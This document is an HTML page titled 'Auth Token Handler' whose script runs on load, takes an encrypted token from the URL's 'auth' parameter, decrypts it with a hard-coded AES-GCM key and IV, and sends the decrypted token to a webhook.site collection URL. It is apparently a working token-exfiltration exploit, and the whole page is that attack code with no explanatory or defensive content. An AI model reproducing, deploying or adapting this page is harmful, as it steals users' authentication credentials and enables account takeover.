<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auth Token Handler</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            max-width: 800px;
            margin: 50px auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        #log {
            background-color: #1e1e1e;
            color: #00ff00;
            padding: 20px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
            min-height: 200px;
            font-size: 12px;
        }
        h1 {
            color: #333;
        }
    </style>
</head>
<body>
    <h1>Auth Token Handler</h1>
    <pre id="log"></pre>

    <script>
        const log = (m) => {
            document.getElementById('log').textContent += m + "\n";
        };

        // Base64 to ArrayBuffer helper
        function base64ToArrayBuffer(base64) {
            const binaryString = atob(base64);
            const bytes = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                bytes[i] = binaryString.charCodeAt(i);
            }
            return bytes.buffer;
        }

        // String to ArrayBuffer helper
        function stringToArrayBuffer(str) {
            const encoder = new TextEncoder();
            return encoder.encode(str);
        }

        // ArrayBuffer to String helper
        function arrayBufferToString(buffer) {
            const decoder = new TextDecoder();
            return decoder.decode(buffer);
        }

        // Decrypt token function
        async function decryptToken(aesKey, ivStr, encrypted) {
            try {
                // First, replace *c4l* with /
                const combined = encrypted.replace(/\*c4l\*/g, "/");
                log("After replacing *c4l* with /:");
                log(combined.substring(0, 100) + "...");
                
                // Find the last space - this separates ciphertext from tag
                const lastSpaceIndex = combined.lastIndexOf(" ");
                if (lastSpaceIndex === -1) {
                    throw new Error("Invalid encrypted format: no space found to separate ciphertext and tag");
                }
                
                // Split into ciphertext and tag
                const encCt = combined.substring(0, lastSpaceIndex);
                const encTag = combined.substring(lastSpaceIndex + 1);
                
                log("\n=== Separated Components ===");
                log("Ciphertext length: " + encCt.length);
                log("Ciphertext (first 100 chars): " + encCt.substring(0, 100) + "...");
                log("Tag: " + encTag);
                
                // Base64 decode
                const ciphertext = base64ToArrayBuffer(encCt);
                const tag = base64ToArrayBuffer(encTag);
                
                log("\nDecoded lengths:");
                log("Ciphertext bytes: " + ciphertext.byteLength);
                log("Tag bytes: " + tag.byteLength);
                
                // Combine ciphertext and tag
                const ctTag = new Uint8Array(ciphertext.byteLength + tag.byteLength);
                ctTag.set(new Uint8Array(ciphertext), 0);
                ctTag.set(new Uint8Array(tag), ciphertext.byteLength);
                
                // Convert key and IV to ArrayBuffer
                const keyBytes = stringToArrayBuffer(aesKey);
                const ivBytes = stringToArrayBuffer(ivStr);
                
                // Import the key
                const cryptoKey = await crypto.subtle.importKey(
                    'raw',
                    keyBytes,
                    { name: 'AES-GCM' },
                    false,
                    ['decrypt']
                );
                
                // Decrypt
                const plaintext = await crypto.subtle.decrypt(
                    {
                        name: 'AES-GCM',
                        iv: ivBytes,
                        tagLength: 128
                    },
                    cryptoKey,
                    ctTag
                );
                
                return arrayBufferToString(plaintext);
            } catch (error) {
                log("\nDecryption error: " + error.message);
                throw error;
            }
        }

        // Main execution
        async function main() {
            const params = new URLSearchParams(window.location.search);
            const auth = params.get("auth");

            if (auth) {
                log("=== Original Auth Parameter ===");
                log(auth.substring(0, 100) + "...\n");
                
                // Remove first character
                let modifiedAuth = auth.substring(1);
                log("=== After Removing First Char ===");
                log(modifiedAuth.substring(0, 100) + "...\n");
                
                // Replace %20 with space
                modifiedAuth = modifiedAuth.replace(/%20/g, " ");
                log("=== After Replacing %20 with Space ===");
                log(modifiedAuth.substring(0, 100) + "...\n");
                
                // Decrypt the token
                const aesKey = "ad5381fdfee6c65bab7789c1218b0e9b";
                const ivStr = "4d35d223ad003c76";
                
                try {
                    const decryptedToken = await decryptToken(aesKey, ivStr, modifiedAuth);
                    log("\n=== DECRYPTED TOKEN ===");
                    log(decryptedToken);
                    
                    // Construct webhook URL with decrypted token
                    const webhookUrl = `https://webhook.site/804f337b-de96-452c-b679-d7988577487b/c=${encodeURIComponent(decryptedToken)}`;
                    log("\n=== Sending to Webhook ===");
                    log("URL: " + webhookUrl);
                    
                    // Send request
                    const response = await fetch(webhookUrl);
                    log("\nRequest sent successfully!");
                    log("Status: " + response.status);
                    
                    const data = await response.text();
                    log("Response: " + data);
                } catch (error) {
                    log("\n=== ERROR ===");
                    log(error.message);
                    log(error.stack);
                }
            } else {
                log("No auth parameter present.");
                log("Usage: Add ?auth=YOUR_ENCRYPTED_TOKEN to the URL");
            }
        }

        // Run main function
        main();
    </script>
</body>
</html>
